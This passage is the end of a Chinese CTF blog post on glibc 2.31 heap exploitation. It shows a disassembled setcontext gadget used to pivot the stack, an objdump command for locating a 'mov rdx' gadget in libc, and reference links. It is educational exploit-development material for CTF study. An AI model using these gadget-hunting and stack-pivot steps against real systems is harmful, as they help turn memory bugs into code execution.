<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mov     rsp, [rdx+0A0h]<br>mov     rbx, [rdx+80h]<br>mov     rbp, [rdx+78h]<br>mov     r12, [rdx+48h]<br>mov     r13, [rdx+50h]<br>mov     r14, [rdx+58h]<br>mov     r15, [rdx+60h]<br>test    dword ptr fs:48h, 2<br>jz      loc_581C6<br>mov     rsi, [rdx+3A8h]<br>mov     rdi, rsi<br>mov     rcx, [rdx+3B0h]<br></code></pre></td></tr></table></figure>



<h4 id="快速查找指令"><a href="#快速查找指令" class="headerlink" title="快速查找指令"></a>快速查找指令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">objdump -M intel -D libc.so.6 | grep &quot;mov    rdx,QWORD PTR \[rdi+0x8\]&quot;<br></code></pre></td></tr></table></figure>





<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/136983333">https://zhuanlan.zhihu.com/p/136983333</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/194960">https://www.anquanke.com/post/id/194960</a></p>
<p><a target="_blank" rel="noopener" href="http://blog.eonew.cn/archives/1167">http://blog.eonew.cn/archives/1167</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div id="footer-link" style="right: calc(50% - 1px);order: 1;border-right: 1px solid #fe2;padding-left: unset;max-width: calc(50% - 4px);"><a href="/2020/10/30/security/bug/qq-linux-vul-report/">← Next linux qq 崩溃调试分析</a></div><div id="footer-link" style="left: 50%;order: 0;border-left: 1px solid #fe2;padding-right: unset;max-width: calc(50% - 5px);"><a href="/2020/10/25/dev/language/go/golang-escape-analysis/">Go逃逸分析 Prev →</a></div></div></div><details id="reward"><summary>打赏</summary><div id="alipay"><span>支付宝 | Alipay</span><br><img src="/img/Alipay.png"></div><div id="wechat"><span>微信 | WeChat</span><br><img src="/img/WeChat.png"></div></details><div id="Valine"></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="index">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://github.com/i0gan">I0gan</a></h1><div id="description"></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HEAP-2020-%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0"><span class="toc-text">HEAP-2020-姿势学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Tcache%E7%BB%93%E6%9E%84"><span class="toc-text">Tcache结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-entry"><span class="toc-text">tcache_entry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-put-amp-amp-tcache-get"><span class="toc-text">tcache_put &amp;&amp; tcache_get</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#free%E5%87%BD%E6%95%B0"><span class="toc-text">free函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#glibc-2-31"><span class="toc-text">glibc-2.31</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LIBC-2-31%E5%88%A9%E7%94%A8%E4%BE%8B%E5%AD%90"><span class="toc-text">LIBC-2.31利用例子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BYTECTF-2020-GUN"><span class="toc-text">BYTECTF-2020-GUN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0"><span class="toc-text">简单描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vul"><span class="toc-text">vul</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF"><span class="toc-text">其他姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E4%BB%98orw"><span class="toc-text">应付orw</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%85%A5%E5%A0%86%E6%A0%88%E4%B8%AD"><span class="toc-text">打入堆栈中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E6%A0%88%E8%BF%81%E7%A7%BB%E8%87%B3%E5%A0%86"><span class="toc-text">堆栈迁移至堆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E6%8C%87%E4%BB%A4"><span class="toc-text">快速查找指令</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div><footer><nobr><span class="text-title">ICP</span><a class="text-content" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">沪ICP备2021037250号-1  </a></nobr><nobr><span class="text-title">©</span><span class="text-content">1899 to 2022</span></nobr><br></footer></aside></main><canvas id="canvas-dust"></canvas><div id="cursor-container"><div id="cursor-outer"></div><div id="cursor-effect"></div></div><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
 el: '#Valine'
 , appId: 'LSe7mf1XYliLqgIrc3jlqXfT-gzGzoHsz'
 , appKey: 'Fu9giJfnidkCamaW89FUpidw' , placeholder: '此条评论委托企鹅物流发送'
});code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="//unpkg.com/@highlightjs/cdn-assets@11.4.0/highlight.min.js"></script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>